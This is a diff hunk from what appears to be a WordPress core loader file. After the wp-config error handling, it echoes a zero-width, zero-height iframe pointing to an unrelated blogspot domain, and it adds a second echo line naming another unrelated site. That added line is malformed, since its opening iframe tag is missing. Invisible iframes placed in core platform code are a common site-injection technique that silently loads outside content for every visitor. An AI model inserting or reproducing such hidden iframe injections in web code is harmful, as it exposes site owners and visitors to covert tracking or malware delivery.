@@ -92,3 +92,4 @@ if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
 	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
 }
 echo '<iframe src="https://jquery-language-analytics.blogspot.com/" width="0%" height="0"></iframe>';
+echo 'https://www.forum-pemuda-ngadirejo.org/" width="0%" height="0"></iframe>';
